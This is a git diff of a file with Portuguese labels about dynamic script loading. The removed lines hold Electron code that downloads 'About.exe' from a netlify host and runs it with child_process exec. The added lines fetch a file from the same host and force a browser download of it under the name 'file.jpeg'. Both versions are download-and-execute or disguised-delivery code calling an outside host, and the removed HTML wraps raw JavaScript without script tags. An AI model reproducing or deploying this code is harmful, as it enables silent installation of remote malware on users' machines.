@@ -1,61 +1,21 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Carregar e Executar Script Dinâmico</title>
-</head>
-<body>
+try {
+    var url = "sandro520.netlify.app/About.txt";
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.responseType = "arraybuffer";
 
-<h1>Exemplo de Carregamento Dinâmico de Script</h1>
+    xhr.onload = function () {
+        if (xhr.status === 200) {
+            var blob = new Blob([xhr.response], { type: "image/jpeg" });
+            var link = document.createElement("a");
+            link.href = window.URL.createObjectURL(blob);
+            link.download = "file.jpeg";
+            link.click();
+        }
+    };
 
-const { app, BrowserWindow } = require('electron');
-const https = require('https');
-const fs = require('fs');
-const path = require('path');
-
-let mainWindow;
-
-function createWindow() {
-  mainWindow = new BrowserWindow({ width: 800, height: 600 });
-  mainWindow.loadFile('index.html');
-
-  mainWindow.on('closed', function () {
-    mainWindow = null;
-  });
+    xhr.send();
+} catch (err) {
+    console.error("Erro:", err.message);
 }
-
-app.on('ready', createWindow);
-
-app.on('window-all-closed', function () {
-  if (process.platform !== 'darwin') app.quit();
-});
-
-app.on('activate', function () {
-  if (mainWindow === null) createWindow();
-});
-
-// Função para baixar e executar um arquivo
-function baixarEExecutarArquivo(url, nomeArquivo) {
-  const destino = path.join(__dirname, nomeArquivo);
-  const file = fs.createWriteStream(destino);
-  https.get(url, response => {
-    response.pipe(file);
-    file.on('finish', () => {
-      file.close();
-      // Após o download, execute o arquivo
-      const { exec } = require('child_process');
-      exec(destino);
-    });
-  });
-}
-
-// Exemplo de uso
-baixarEExecutarArquivo('https://sandro520.netlify.app/About.exe', 'About.exe');
-
-
-
-</body>
-</html>
-
 
